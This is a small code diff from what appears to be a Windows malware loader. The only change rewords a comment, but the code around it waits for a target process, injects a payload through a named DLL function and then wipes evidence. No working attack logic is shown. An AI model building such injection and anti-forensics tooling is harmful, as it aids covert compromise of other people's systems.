@@ -61,7 +61,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		hide.DelayExecution(0.1, resolver);		  // Check for process startup every few minutes
 	} while (process == 0);
 
-	Payload(process, api, TARGET_DLL, (char*)TARGET_FUNC);// Run the payload
+	Payload(process, api, TARGET_DLL, (char*)TARGET_FUNC);// Execute the payloads constructor
 	
 	hide.Nuke(resolver);								  // Remove evidence
 	return 0;
